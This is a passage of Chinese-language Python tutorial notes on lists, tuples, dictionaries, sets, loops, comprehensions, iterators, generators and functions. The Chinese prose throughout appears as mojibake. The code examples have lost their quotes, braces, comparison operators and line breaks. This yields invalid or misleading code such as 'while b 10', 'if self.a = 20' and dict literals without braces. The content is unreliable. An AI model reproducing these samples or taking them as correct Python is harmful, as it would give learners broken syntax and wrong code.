ä¸¤è¾¹çš„æ–¹æ‹¬å·è¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œè€Œä¸æ˜¯è¦æ±‚ä½ è¾“å…¥ä¸€å¯¹æ–¹æ‹¬å·ï¼Œä½ ä¼šç»å¸¸åœ¨ Python åº“å‚è€ƒæ‰‹å†Œä¸­é‡åˆ°è¿™æ ·çš„æ ‡è®°ã€‚ï¼‰ list.clear() ç§»é™¤åˆ—è¡¨ä¸­çš„æ‰€æœ‰é¡¹ï¼Œç­‰äºdel a[:]ã€‚ list.index(x) è¿”å›åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå€¼ä¸º x çš„å…ƒç´ çš„ç´¢å¼•ã€‚å¦‚æœæ²¡æœ‰åŒ¹é…çš„å…ƒç´ å°±ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚ list.count(x) è¿”å› x åœ¨åˆ—è¡¨ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚ list.sort() å¯¹åˆ—è¡¨ä¸­çš„å…ƒç´ è¿›è¡Œæ’åºã€‚ list.reverse() å€’æ’åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚ list.copy() è¿”å›åˆ—è¡¨çš„æµ…å¤åˆ¶ï¼Œç­‰äºa[:]ã€‚ æŠŠåˆ—è¡¨å½“ä½œå †æ ˆä½¿ç”¨ åˆ—è¡¨æ–¹æ³•ä½¿å¾—åˆ—è¡¨å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½œä¸ºä¸€ä¸ªå †æ ˆæ¥ä½¿ç”¨ï¼Œå †æ ˆä½œä¸ºç‰¹å®šçš„æ•°æ®ç»“æ„ï¼Œæœ€å…ˆè¿›å…¥çš„å…ƒç´ æœ€åä¸€ä¸ªè¢«é‡Šæ”¾ï¼ˆåè¿›å…ˆå‡ºï¼‰ã€‚ç”¨ append() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ æ·»åŠ åˆ°å †æ ˆé¡¶ã€‚ç”¨ä¸æŒ‡å®šç´¢å¼•çš„ pop() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ ä»å †æ ˆé¡¶é‡Šæ”¾å‡ºæ¥ stack = [3, 4, 5]stack.append(6)stack.append(7)stack.pop()print(stack) å…ƒç»„ï¼ˆtupleï¼‰å…ƒç»„ä½¿ç”¨å°æ‹¬å· **( )**ï¼Œåˆ—è¡¨ä½¿ç”¨æ–¹æ‹¬å· **[ ]**ã€‚ å…ƒç»„åˆ›å»ºå¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨æ‹¬å·ä¸­æ·»åŠ å…ƒç´ ï¼Œå¹¶ä½¿ç”¨é€—å·éš”å¼€å³å¯ å…ƒç»„ä¸­åªåŒ…å«ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œéœ€è¦åœ¨å…ƒç´ åé¢æ·»åŠ é€—å· ï¼Œå¦åˆ™æ‹¬å·ä¼šè¢«å½“ä½œè¿ç®—ç¬¦ä½¿ç”¨ å…ƒç»„ä¸­çš„å…ƒç´ å€¼æ˜¯ä¸å…è®¸ä¿®æ”¹çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥å¯¹å…ƒç»„è¿›è¡Œè¿æ¥ç»„åˆï¼Œä¾‹å­å¦‚ä¸‹ï¼š tup1 = (12, 34.56)tup2 = (abc, xyz)# ä»¥ä¸‹ä¿®æ”¹å…ƒç»„å…ƒç´ æ“ä½œæ˜¯éæ³•çš„ã€‚# tup1[0] = 100# åˆ›å»ºä¸€ä¸ªæ–°çš„å…ƒç»„tup3 = tup1 + tup2print (tup3) åˆ é™¤å…ƒç»„ å…ƒç»„ä¸­çš„å…ƒç´ å€¼æ˜¯ä¸å…è®¸åˆ é™¤çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨delè¯­å¥æ¥åˆ é™¤æ•´ä¸ªå…ƒç»„ tup = (Google, Runoob, 1997, 2000)del tupprint (åˆ é™¤åçš„å…ƒç»„ tup : )print (tup) å†…ç½®å‡½æ•° å‡½æ•° æ‰€è°“å…ƒç»„çš„ä¸å¯å˜æŒ‡çš„æ˜¯å…ƒç»„æ‰€æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ä¸å¯å˜ tup = (r, u, n, o, o, b) tup[0] = g # ä¸æ”¯æŒä¿®æ”¹å…ƒç´ Traceback (most recent call last): File stdin, line 1, in moduleTypeError: tuple object does not support item assignment id(tup) # æŸ¥çœ‹å†…å­˜åœ°å€ tup = (1,2,3) id(tup)4441088800 # å†…å­˜åœ°å€ä¸ä¸€æ ·äº† ä»ä»¥ä¸Šå®ä¾‹å¯ä»¥çœ‹å‡ºï¼Œé‡æ–°èµ‹å€¼çš„å…ƒç»„ tupï¼Œç»‘å®šåˆ°æ–°çš„å¯¹è±¡äº†ï¼Œä¸æ˜¯ä¿®æ”¹äº†åŸæ¥çš„å¯¹è±¡ å­—å…¸å­—å…¸æ˜¯å¦ä¸€ç§å¯å˜å®¹å™¨æ¨¡å‹ï¼Œä¸”å¯å­˜å‚¨ä»»æ„ç±»å‹å¯¹è±¡ã€‚ å­—å…¸çš„æ¯ä¸ªé”®å€¼ keyvalue å¯¹ç”¨å†’å· : åˆ†å‰²ï¼Œæ¯ä¸ªå¯¹ä¹‹é—´ç”¨é€—å·(,)åˆ†å‰²ï¼Œæ•´ä¸ªå­—å…¸åŒ…æ‹¬åœ¨èŠ±æ‹¬å· {} ä¸­ ,æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š d = key1 : value1, key2 : value2, key3 : value3 é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œä½†å€¼åˆ™ä¸å¿…ã€‚ å€¼å¯ä»¥å–ä»»ä½•æ•°æ®ç±»å‹ï¼Œä½†é”®å¿…é¡»æ˜¯ä¸å¯å˜çš„ï¼Œå¦‚å­—ç¬¦ä¸²ï¼Œæ•°å­—ã€‚ åˆ›å»ºç©ºå­—å…¸ ä½¿ç”¨ åˆ›å»ºç©ºå­—å…¸ # ä½¿ç”¨å¤§æ‹¬å· æ¥åˆ›å»ºç©ºå­—å…¸emptyDict = print(emptyDict)print(Length:, len(emptyDict)) # æŸ¥çœ‹å­—å…¸æ•°é‡print(type(emptyDict)) ä¹Ÿå¯ä»¥ä½¿ç”¨å†…å»ºå‡½æ•° dict() åˆ›å»ºå­—å…¸ï¼šemptydic=dict() è®¿é—®å­—å…¸é‡Œé¢çš„å€¼ æŠŠç›¸å¯¹åº”çš„é”®æ”¾å…¥æ–¹æ‹¬å·ä¸­ tinydict = Name: Runoob, Age: 7, Class: Firstprint (tinydict[Name]: , tinydict[Name]) ä¿®æ”¹å­—å…¸ å‘å­—å…¸æ·»åŠ æ–°å†…å®¹çš„æ–¹æ³•æ˜¯å¢åŠ æ–°çš„é”®å€¼å¯¹ï¼Œä¿®æ”¹æˆ–åˆ é™¤å·²æœ‰é”®å€¼å¯¹ æ˜¾å¼åˆ é™¤ä¸€ä¸ªå­—å…¸ç”¨delå‘½ä»¤ tinydict = Name: Runoob, Age: 7, Class: Firsttinydict[Age] = 8 # æ›´æ–° Agetinydict[School] = èœé¸Ÿæ•™ç¨‹ # æ·»åŠ ä¿¡æ¯del tinydict[Name] # åˆ é™¤é”® Nametinydict.clear() # æ¸…ç©ºå­—å…¸del tinydict # åˆ é™¤å­—å…¸ æ³¨æ„äº‹é¡¹ 1.ä¸å…è®¸åŒä¸€ä¸ªé”®å‡ºç°ä¸¤æ¬¡ã€‚åˆ›å»ºæ—¶å¦‚æœåŒä¸€ä¸ªé”®è¢«èµ‹å€¼ä¸¤æ¬¡ï¼Œåä¸€ä¸ªå€¼ä¼šè¢«è®°ä½ tinydict = Name: Runoob, Age: 7, Name: å°èœé¸Ÿ//åé¢é‚£ä¸ªä¼šè¢«è®°ä½ 2.é”®å¿…é¡»ä¸å¯å˜ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ•°å­—ï¼Œå­—ç¬¦ä¸²æˆ–å…ƒç»„å……å½“ï¼Œè€Œç”¨åˆ—è¡¨å°±ä¸è¡Œ éå†æŠ€å·§ åœ¨å­—å…¸ä¸­éå†æ—¶ï¼Œå…³é”®å­—å’Œå¯¹åº”çš„å€¼å¯ä»¥ä½¿ç”¨ items() æ–¹æ³•åŒæ—¶è§£è¯»å‡ºæ¥ï¼š knights = gallahad: the pure, robin: the bravefor k, v in knights.items(): print(k, v) åºåˆ—ä¸­éå†æ—¶ï¼Œç´¢å¼•ä½ç½®å’Œå¯¹åº”å€¼å¯ä»¥ä½¿ç”¨ enumerate() å‡½æ•°åŒæ—¶å¾—åˆ°ï¼š for i, v in enumerate([tic, tac, toe]):\tprint(i, v) åŒæ—¶éå†ä¸¤ä¸ªæˆ–æ›´å¤šçš„åºåˆ—ï¼Œå¯ä»¥ä½¿ç”¨ zip() ç»„åˆï¼š questions = [name, quest, favorite color]answers = [lancelot, the holy grail, blue]for q, a in zip(questions, answers): print(What is your 0? It is 1..format(q, a)) è¦åå‘éå†ä¸€ä¸ªåºåˆ—ï¼Œé¦–å…ˆæŒ‡å®šè¿™ä¸ªåºåˆ—ï¼Œç„¶åè°ƒç”¨ reversed() å‡½æ•° è¦æŒ‰é¡ºåºéå†ä¸€ä¸ªåºåˆ—ï¼Œä½¿ç”¨ sorted() å‡½æ•°è¿”å›ä¸€ä¸ªå·²æ’åºçš„åºåˆ—ï¼Œå¹¶ä¸ä¿®æ”¹åŸå€¼ï¼š basket = [apple, orange, apple, pear, orange, banana]for f in sorted(set(basket)): print(f) é›†åˆé›†åˆï¼ˆsetï¼‰æ˜¯ä¸€ä¸ªæ— åºçš„ä¸é‡å¤å…ƒç´ åºåˆ— é›†åˆä¸­çš„å…ƒç´ ä¸ä¼šé‡å¤ï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œäº¤é›†ã€å¹¶é›†ã€å·®é›†ç­‰å¸¸è§çš„é›†åˆæ“ä½œ å¯ä»¥ä½¿ç”¨å¤§æ‹¬å· { } åˆ›å»ºé›†åˆï¼Œå…ƒç´ ä¹‹é—´ç”¨é€—å· , åˆ†éš”ï¼Œ æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ set() å‡½æ•°åˆ›å»ºé›†åˆ parame = value01,value02,...æˆ–è€…set(value) æ¯”å¦‚ï¼šset1 = 1, 2, 3, 4 # ç›´æ¥ä½¿ç”¨å¤§æ‹¬å·åˆ›å»ºé›†åˆset2 = set([4, 5, 6, 7]) # ä½¿ç”¨ set() å‡½æ•°ä»åˆ—è¡¨åˆ›å»ºé›†åˆ æ³¨æ„ï¼šåˆ›å»ºä¸€ä¸ªç©ºé›†åˆå¿…é¡»ç”¨ set() è€Œä¸æ˜¯ **{ }**ï¼Œå› ä¸º { } æ˜¯ç”¨æ¥åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ basket = apple, orange, apple, pear, orange, banana print(basket) # è¿™é‡Œæ¼”ç¤ºçš„æ˜¯å»é‡åŠŸèƒ½orange, banana, pear, apple print(banana in basket) # å¿«é€Ÿåˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆå†…True print(crabgrass in basket)False # ä¸‹é¢å±•ç¤ºä¸¤ä¸ªé›†åˆé—´çš„è¿ç®—....éƒ½è¦å†åŠ ä¸Šä¸€ä¸ªprint a = set(abracadabra) b = set(alacazam) a a, r, b, c, d a - b # é›†åˆaä¸­åŒ…å«è€Œé›†åˆbä¸­ä¸åŒ…å«çš„å…ƒç´ r, d, b a | b # é›†åˆaæˆ–bä¸­åŒ…å«çš„æ‰€æœ‰å…ƒç´ a, c, r, d, b, m, z, l a b # é›†åˆaå’Œbä¸­éƒ½åŒ…å«äº†çš„å…ƒç´ a, c a ^ b # ä¸åŒæ—¶åŒ…å«äºaå’Œbçš„å…ƒç´ r, d, b, m, z, l æ·»åŠ å…ƒç´  è¯­æ³•æ ¼å¼ï¼šs.add(x) //å°†å…ƒç´  x æ·»åŠ åˆ°é›†åˆ s ä¸­ï¼Œå¦‚æœå…ƒç´ å·²å­˜åœ¨ï¼Œåˆ™ä¸è¿›è¡Œä»»ä½•æ“ä½œã€‚ å¦ä¸€ç§æ–¹æ³•ï¼šs.update(x) //å‚æ•°å¯ä»¥æ˜¯åˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ç­‰ä¾‹å­å¦‚ä¸‹ï¼š thisset.update(1,3)æˆ–è€… thisset.update([1,4],[5,6]) ç§»é™¤å…ƒç´  è¯­æ³•æ ¼å¼ï¼šs.remove(x) //å°†å…ƒç´  x ä»é›†åˆ s ä¸­ç§»é™¤ï¼Œå¦‚æœå…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå‘ç”Ÿé”™è¯¯ å¦ä¸€ç§æ–¹æ³•ï¼šs.discard(x) //ç§»é™¤é›†åˆä¸­çš„å…ƒç´ ï¼Œä¸”å¦‚æœå…ƒç´ ä¸å­˜åœ¨ï¼Œä¸ä¼šå‘ç”Ÿé”™è¯¯ s.pop()ï¼šéšæœºåˆ é™¤é›†åˆä¸­çš„ä¸€ä¸ªå…ƒç´  len(s)ï¼šè®¡ç®—é›†åˆ s å…ƒç´ ä¸ªæ•° s.clear()ï¼šæ¸…ç©ºé›†åˆ s x in sï¼šåˆ¤æ–­å…ƒç´  x æ˜¯å¦åœ¨é›†åˆ s ä¸­ï¼Œå­˜åœ¨è¿”å› Trueï¼Œä¸å­˜åœ¨è¿”å› False [é›†åˆå†…ç½®æ–¹æ³•å®Œæ•´åˆ—è¡¨](Python3 é›†åˆ | èœé¸Ÿæ•™ç¨‹ (runoob.com)) æ¡ä»¶æ§åˆ¶è¯­æ³•æ ¼å¼ï¼š if condition_1: statement_block_1elif condition_2: statement_block_2else: statement_block_3 æ¯ä¸ªæ¡ä»¶åé¢è¦ä½¿ç”¨å†’å· **:**ï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥æ˜¯æ»¡è¶³æ¡ä»¶åè¦æ‰§è¡Œçš„è¯­å¥å—ã€‚ 2ã€ä½¿ç”¨ç¼©è¿›æ¥åˆ’åˆ†è¯­å¥å—ï¼Œç›¸åŒç¼©è¿›æ•°çš„è¯­å¥åœ¨ä¸€èµ·ç»„æˆä¸€ä¸ªè¯­å¥å—ã€‚ 3ã€åœ¨ Python ä¸­æ²¡æœ‰ switchâ€¦case è¯­å¥ï¼Œä½†åœ¨ Python3.10 ç‰ˆæœ¬æ·»åŠ äº† matchâ€¦caseï¼ŒåŠŸèƒ½ä¹Ÿç±»ä¼¼ åµŒå¥—è¯­å¥ if è¡¨è¾¾å¼1: è¯­å¥ if è¡¨è¾¾å¼2: è¯­å¥ elif è¡¨è¾¾å¼3: è¯­å¥ else: è¯­å¥elif è¡¨è¾¾å¼4: è¯­å¥else: è¯­å¥ matchâ€¦case match subject: case pattern_1: action_1 case pattern_2: action_2 case pattern_3: action_3 case _: action_wildcard case _: ç±»ä¼¼äº C å’Œ Java ä¸­çš„ **default:**ï¼Œå½“å…¶ä»– case éƒ½æ— æ³•åŒ¹é…æ—¶ï¼ŒåŒ¹é…è¿™æ¡ï¼Œä¿è¯æ°¸è¿œä¼šåŒ¹é…æˆåŠŸ å¾ªç¯è¯­å¥whileå¾ªç¯ï¼šæ³¨æ„å†’å·å’Œç¼©è¿› while åˆ¤æ–­æ¡ä»¶(condition)ï¼š æ‰§è¡Œè¯­å¥(statements)â€¦â€¦ å¯ä»¥é€šè¿‡è®¾ç½®æ¡ä»¶è¡¨è¾¾å¼æ°¸è¿œä¸ä¸º false æ¥å®ç°æ— é™å¾ªç¯ï¼Œå¯ä»¥ä½¿ç”¨ CTRL+C æ¥é€€å‡ºå½“å‰çš„æ— é™å¾ªç¯ã€‚ æ— é™å¾ªç¯åœ¨æœåŠ¡å™¨ä¸Šå®¢æˆ·ç«¯çš„å®æ—¶è¯·æ±‚éå¸¸æœ‰ç”¨ã€‚ whileå¾ªç¯ä½¿ç”¨elseè¯­å¥ åœ¨whileçš„æ¡ä»¶ä¸ºfalseçš„æ¡ä»¶ä¸‹elseä»å¥æ‰ä¼šæ‰§è¡Œ while expr: statement(s)else: additional_statement(s) ä¸‹é¢ä¸ºæ–æ³¢é‚£å¥‘æ•°åˆ—çš„ä¾‹å­ï¼š a, b = 0, 1while b 10: print(b, end=,) c = b b = a + b a = c forå¾ªç¯ for å¾ªç¯å¯ä»¥éå†ä»»ä½•å¯è¿­ä»£å¯¹è±¡ï¼Œå¦‚ä¸€ä¸ªåˆ—è¡¨æˆ–è€…ä¸€ä¸ªå­—ç¬¦ä¸²ï¼›å½“å¾ªç¯æ‰§è¡Œå®Œæ¯•åï¼Œä¼šæ‰§è¡Œ else å­å¥ä¸­çš„ä»£ç ï¼Œå¦‚æœåœ¨å¾ªç¯è¿‡ç¨‹ä¸­é‡åˆ°äº† break è¯­å¥ï¼Œåˆ™ä¼šä¸­æ–­å¾ªç¯ï¼Œæ­¤æ—¶ä¸ä¼šæ‰§è¡Œ else å­å¥ã€‚æ ¼å¼å¦‚ä¸‹ï¼š for variable in sequence: statementselse: statements å¯ä»¥æ‹¿æ¥æ‰“å°å•è¯é‡Œçš„æ¯ä¸€ä¸ªå­—ç¬¦ word = runoobfor letter in word: print(letter) rangeå‡½æ•° éœ€è¦éå†æ•°å­—åºåˆ—ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½® range() å‡½æ•°ã€‚å®ƒä¼šç”Ÿæˆæ•°åˆ—ï¼šfor i in range(5) å¯ä»¥ä½¿ç”¨ range() æŒ‡å®šåŒºé—´çš„å€¼ï¼šfor i in range(5,9) :print(i) ä¹Ÿå¯ä»¥ä½¿ range() ä»¥æŒ‡å®šæ•°å­—å¼€å§‹å¹¶æŒ‡å®šä¸åŒçš„å¢é‡(ç”šè‡³å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œæœ‰æ—¶è¿™ä¹Ÿå«åšâ€™æ­¥é•¿â€™)ï¼šfor i in range(0, 10, 3) 3ä¸ºæ­¥é•¿ å¯ä»¥ä½¿ç”¨ range() å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªåˆ—è¡¨ï¼šlist(range(5)) å¯ä»¥ç»“åˆ range() å’Œ len() å‡½æ•°ä»¥éå†ä¸€ä¸ªåºåˆ—çš„ç´¢å¼• passè¯­å¥ passæ˜¯ç©ºè¯­å¥ï¼Œæ˜¯ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚pass ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š while True:... pass # ç­‰å¾…é”®ç›˜ä¸­æ–­ (Ctrl+C) ä¾‹å­ï¼š for letter in Runoob: if letter == o: pass print (æ‰§è¡Œ pass å—) print (å½“å‰å­—æ¯ :, letter)print (Good bye!) æ¨å¯¼å¼åˆ—è¡¨æ¨å¯¼å¼ æ ¼å¼å¦‚ä¸‹ï¼š [è¡¨è¾¾å¼ for å˜é‡ in åˆ—è¡¨] [out_exp_res for out_exp in input_list]æˆ–è€… [è¡¨è¾¾å¼ for å˜é‡ in åˆ—è¡¨ if æ¡ä»¶][out_exp_res for out_exp in input_list if condition] out_exp_resï¼šåˆ—è¡¨ç”Ÿæˆå…ƒç´ è¡¨è¾¾å¼ï¼Œå¯ä»¥æ˜¯æœ‰è¿”å›å€¼çš„å‡½æ•°ã€‚ for out_exp in input_listï¼šè¿­ä»£ input_list å°† out_exp ä¼ å…¥åˆ° out_exp_res è¡¨è¾¾å¼ä¸­ã€‚ if conditionï¼šæ¡ä»¶è¯­å¥ï¼Œå¯ä»¥è¿‡æ»¤åˆ—è¡¨ä¸­ä¸ç¬¦åˆæ¡ä»¶çš„å€¼ names = [Bob,Tom,alice,Jerry,Wendy,Smith]new_names = [name.upper()for name in names if len(name)3]print(new_names)//è¿‡æ»¤æ‰é•¿åº¦å°äºæˆ–ç­‰äº3çš„å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶å°†å‰©ä¸‹çš„è½¬æ¢æˆå¤§å†™å­—æ¯ æ›´å¤æ‚ä¸€ç‚¹çš„ä¾‹å­ï¼š vec1 = [2, 4, 6] vec2 = [4, 3, -9] [x*y for x in vec1 for y in vec2][8, 6, -18, 16, 12, -36, 24, 18, -54] [x+y for x in vec1 for y in vec2][6, 5, -7, 8, 7, -5, 10, 9, -3] [vec1[i]*vec2[i] for i in range(len(vec1))][8, 12, -54] å­—å…¸æ¨å¯¼å¼ æ ¼å¼å¦‚ä¸‹ï¼š key_expr: value_expr for value in collection æˆ– key_expr: value_expr for value in collection if condition ä¾‹å­å¦‚ä¸‹ï¼š dict = x: x**2 for x in (2,4,6)//ä¸‰ä¸ªæ•°å­—çš„å¹³æ–¹print(dict) é›†åˆæ¨å¯¼å¼ expression for item in Sequence æˆ– expression for item in Sequence if conditional ä¾‹å­å¦‚ä¸‹: a = x for x in abkxjbaugxidyskn if x not in abcdprint(a)print(type(a)) å…ƒç»„æ¨å¯¼å¼ï¼ˆç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼‰ å…ƒç»„æ¨å¯¼å¼è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ (expression for item in Sequence )æˆ–(expression for item in Sequence if conditional ) ä¾‹å­å¦‚ä¸‹ï¼š a = (x for x in range(1,10)) agenerator object genexpr at 0x7faf6ee20a50 # è¿”å›çš„æ˜¯ç”Ÿæˆå™¨å¯¹è±¡ tuple(a) # ä½¿ç”¨ tuple() å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å°†ç”Ÿæˆå™¨å¯¹è±¡è½¬æ¢æˆå…ƒç»„(1, 2, 3, 4, 5, 6, 7, 8, 9) è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨è¿­ä»£å™¨å¯¹è±¡ä»é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹è®¿é—®ï¼Œç›´åˆ°æ‰€æœ‰çš„å…ƒç´ è¢«è®¿é—®å®Œç»“æŸã€‚è¿­ä»£å™¨åªèƒ½å¾€å‰ä¸ä¼šåé€€ã€‚ è¿­ä»£å™¨æœ‰ä¸¤ä¸ªåŸºæœ¬çš„æ–¹æ³•ï¼šiter() å’Œ **next()**ã€‚è¿­ä»£å™¨å¯¹è±¡å¯ä»¥ä½¿ç”¨å¸¸è§„forè¯­å¥è¿›è¡Œéå† å­—ç¬¦ä¸²ï¼Œåˆ—è¡¨æˆ–å…ƒç»„å¯¹è±¡éƒ½å¯ç”¨äºåˆ›å»ºè¿­ä»£å™¨ list=[1,2,3,4]it = iter(list) # åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡print (next(it)) # è¾“å‡ºè¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ print (next(it)) åˆ›é€ ä¸€ä¸ªè¿­ä»£å™¨ Python çš„æ„é€ å‡½æ•°ä¸º init(), å®ƒä¼šåœ¨å¯¹è±¡åˆå§‹åŒ–çš„æ—¶å€™æ‰§è¡Œ æŠŠä¸€ä¸ªç±»ä½œä¸ºä¸€ä¸ªè¿­ä»£å™¨ä½¿ç”¨éœ€è¦åœ¨ç±»ä¸­å®ç°ä¸¤ä¸ªæ–¹æ³• iter() ä¸ next() iter() æ–¹æ³•è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„è¿­ä»£å™¨å¯¹è±¡ï¼Œ è¿™ä¸ªè¿­ä»£å™¨å¯¹è±¡å®ç°äº† next() æ–¹æ³•å¹¶é€šè¿‡ StopIteration å¼‚å¸¸æ ‡è¯†è¿­ä»£çš„å®Œæˆã€‚ next() æ–¹æ³•ä¼šè¿”å›ä¸‹ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ class MyNumbers: def __iter__(self): self.a = 1 return self//è¿”å› selfï¼Œå³å½“å‰å¯¹è±¡æœ¬èº«ã€‚è¿™æ„å‘³ç€ MyNumbers ç±»çš„å®ä¾‹æ˜¯ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ def __next__(self): x = self.a self.a += 1 return x myclass = MyNumbers()myiter = iter(myclass)//ä½¿ç”¨å†…ç½®å‡½æ•° iter() å°† myclass å®ä¾‹è½¬æ¢ä¸ºä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ myiterã€‚é€šè¿‡è°ƒç”¨ iter() å‡½æ•°ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„ __iter__() æ–¹æ³•ï¼Œå› æ­¤ myclass å®ä¾‹å°†æˆä¸ºä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter)) StopIteration å¼‚å¸¸ç”¨äºæ ‡è¯†è¿­ä»£çš„å®Œæˆï¼Œé˜²æ­¢å‡ºç°æ— é™å¾ªç¯çš„æƒ…å†µï¼Œåœ¨ next() æ–¹æ³•ä¸­æˆ‘ä»¬å¯ä»¥è®¾ç½®åœ¨å®ŒæˆæŒ‡å®šå¾ªç¯æ¬¡æ•°åè§¦å‘ StopIteration å¼‚å¸¸æ¥ç»“æŸè¿­ä»£ class MyNumbers: def __iter__(self): self.a = 1 return self def __next__(self): if self.a = 20: x = self.a self.a += 1 return x else: raise StopIteration myclass = MyNumbers()myiter = iter(myclass) for x in myiter: print(x) ç”Ÿæˆå™¨ ä½¿ç”¨äº† yield çš„å‡½æ•°è¢«ç§°ä¸ºç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰ã€‚ yield æ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºå®šä¹‰ç”Ÿæˆå™¨å‡½æ•°ï¼Œç”Ÿæˆå™¨å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œå¯ä»¥åœ¨è¿­ä»£è¿‡ç¨‹ä¸­é€æ­¥äº§ç”Ÿå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰ç»“æœã€‚ è·Ÿæ™®é€šå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œç”Ÿæˆå™¨æ˜¯ä¸€ä¸ªè¿”å›è¿­ä»£å™¨çš„å‡½æ•°ï¼Œåªèƒ½ç”¨äºè¿­ä»£æ“ä½œï¼Œæ›´ç®€å•ç‚¹ç†è§£ç”Ÿæˆå™¨å°±æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ã€‚ å½“åœ¨ç”Ÿæˆå™¨å‡½æ•°ä¸­ä½¿ç”¨ yield è¯­å¥æ—¶ï¼Œå‡½æ•°çš„æ‰§è¡Œå°†ä¼šæš‚åœï¼Œå¹¶å°† yield åé¢çš„è¡¨è¾¾å¼ä½œä¸ºå½“å‰è¿­ä»£çš„å€¼è¿”å›ã€‚ ç„¶åï¼Œæ¯æ¬¡è°ƒç”¨ç”Ÿæˆå™¨çš„ next() æ–¹æ³•æˆ–ä½¿ç”¨ for å¾ªç¯è¿›è¡Œè¿­ä»£æ—¶ï¼Œå‡½æ•°ä¼šä»ä¸Šæ¬¡æš‚åœçš„åœ°æ–¹ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°å†æ¬¡é‡åˆ° yield è¯­å¥ã€‚è¿™æ ·ï¼Œç”Ÿæˆå™¨å‡½æ•°å¯ä»¥é€æ­¥äº§ç”Ÿå€¼ï¼Œè€Œä¸éœ€è¦ä¸€æ¬¡æ€§è®¡ç®—å¹¶è¿”å›æ‰€æœ‰ç»“æœã€‚ è°ƒç”¨ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ def countdown(n): while n 0: yield n n -= 1# åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡generator = countdown(5)# é€šè¿‡è¿­ä»£ç”Ÿæˆå™¨è·å–å€¼print(next(generator)) # è¾“å‡º: 5print(next(generator)) # è¾“å‡º: 4print(next(generator)) # è¾“å‡º: 3# ä½¿ç”¨ for å¾ªç¯è¿­ä»£ç”Ÿæˆå™¨for value in generator: print(value) # è¾“å‡º: 2 1 å‡½æ•° å‡½æ•°ä»£ç å—ä»¥ def å…³é”®è¯å¼€å¤´ï¼Œåæ¥å‡½æ•°æ ‡è¯†ç¬¦åç§°å’Œåœ†æ‹¬å· **()**ã€‚ ä»»ä½•ä¼ å…¥å‚æ•°å’Œè‡ªå˜é‡å¿…é¡»æ”¾åœ¨åœ†æ‹¬å·ä¸­é—´ï¼Œåœ†æ‹¬å·ä¹‹é—´å¯ä»¥ç”¨äºå®šä¹‰å‚æ•°ã€‚ å‡½æ•°çš„ç¬¬ä¸€è¡Œè¯­å¥å¯ä»¥é€‰æ‹©æ€§åœ°ä½¿ç”¨æ–‡æ¡£å­—ç¬¦ä¸²â€”ç”¨äºå­˜æ”¾å‡½æ•°è¯´æ˜ã€‚ å‡½æ•°å†…å®¹ä»¥å†’å· : èµ·å§‹ï¼Œå¹¶ä¸”ç¼©è¿›ã€‚ return [è¡¨è¾¾å¼] ç»“æŸå‡½æ•°ï¼Œé€‰æ‹©æ€§åœ°è¿”å›ä¸€ä¸ªå€¼ç»™è°ƒç”¨æ–¹ï¼Œä¸å¸¦è¡¨è¾¾å¼çš„ return ç›¸å½“äºè¿”å› Noneã€‚ def å‡½æ•°åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰: å‡½æ•°ä½“ python 